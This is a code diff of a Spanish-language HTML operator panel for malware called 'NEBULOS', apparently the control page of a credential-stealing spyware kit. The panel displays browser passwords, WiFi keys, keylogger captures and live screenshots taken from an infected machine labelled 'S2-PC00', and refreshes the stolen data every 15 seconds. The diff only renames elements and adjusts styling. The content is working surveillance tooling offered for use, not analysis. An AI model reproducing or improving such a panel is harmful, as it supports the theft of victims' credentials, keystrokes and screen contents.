@@ -1,29 +1,25 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>NEBULOS | COMMAND CENTER</title>
+    <title>NEBULOS | S2-PC00 COMMAND</title>
     <style>
         body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
-        .box { border: 2px solid #0f0; padding: 15px; box-shadow: 0 0 20px #030; }
         .nav { margin-bottom: 15px; border-bottom: 1px solid #0f0; padding-bottom: 10px; }
-        button { background: #000; color: #0f0; border: 1px solid #0f0; padding: 8px; cursor: pointer; }
+        button { background: #000; color: #0f0; border: 1px solid #0f0; padding: 10px; cursor: pointer; }
         button:hover, .act { background: #0f0; color: #000; font-weight: bold; }
-        #out { white-space: pre-wrap; height: 450px; overflow: auto; border: 1px inset #030; padding: 10px; background: #050505; }
+        #log { white-space: pre-wrap; height: 500px; overflow: auto; border: 1px inset #030; padding: 10px; background: #050505; }
         img { display: none; width: 100%; border: 1px solid #0f0; margin-top: 10px; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <h2>[ NEBULOS ELITE C2 ]</h2>
-        <div class="nav">
-            <button class="act" onclick="v('n')">PASSWORDS</button>
-            <button onclick="v('w')">WIFI</button>
-            <button onclick="v('k')">KEYLOG</button>
-            <button onclick="v('s')">VISTA EN VIVO (10s)</button>
-        </div>
-        <pre id="out">Cargando enlace...</pre>
-        <img id="ss">
+    <div class="nav">
+        <button class="act" onclick="v('n')">PASSWORDS</button>
+        <button onclick="v('w')">WIFI</button>
+        <button onclick="v('k')">KEYLOG</button>
+        <button onclick="v('s')">LIVE SCREEN (10s)</button>
     </div>
+    <pre id="log">Conectando con agente S2-PC00...</pre>
+    <img id="img-view">
 
     <script>
         let raw = "";
@@ -34,16 +30,15 @@
             } catch(e) {}
         }
         function v(m) {
-            const out = document.getElementById('out');
-            const img = document.getElementById('ss');
-            img.style.display = "none"; out.style.display = "block";
-            
-            if(m==='n') out.textContent = raw.split('--- NAVEGADOR ---')[1]?.split('--- KEYS ---')[0];
-            else if(m==='w') out.textContent = raw.split('--- WIFI ---')[1]?.split('--- NAVEGADOR ---')[0];
-            else if(m==='k') out.textContent = raw.split('--- KEYS ---')[1]?.split('--- SS ---')[0];
+            const l = document.getElementById('log');
+            const i = document.getElementById('img-view');
+            i.style.display = "none"; l.style.display = "block";
+            if(m==='w') l.textContent = raw.split('--- WIFI ---')[1]?.split('--- NAV ---')[0];
+            else if(m==='n') l.textContent = raw.split('--- NAV ---')[1]?.split('--- KEYS ---')[0];
+            else if(m==='k') l.textContent = raw.split('--- KEYS ---')[1]?.split('--- SS ---')[0];
             else if(m==='s') {
                 const b = raw.split('--- SS ---')[1]?.trim();
-                if(b) { img.src = "data:image/png;base64," + b; img.style.display = "block"; out.style.display = "none"; }
+                if(b) { i.src = "data:image/png;base64," + b; i.style.display = "block"; l.style.display = "none"; }
             }
         }
         setInterval(up, 15000); up();
